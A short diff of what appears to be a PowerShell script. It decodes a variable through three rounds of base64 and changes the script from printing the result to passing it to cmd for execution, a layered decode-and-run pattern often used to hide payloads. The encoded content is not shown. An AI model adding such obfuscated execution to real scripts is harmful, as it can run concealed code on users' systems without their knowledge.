@@ -3,5 +3,4 @@
 for ($i = 0; $i -lt 3; $i++) 
 { $C = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($C)) }
 
-$C
-#cmd -t($C)
+cmd -t($C)
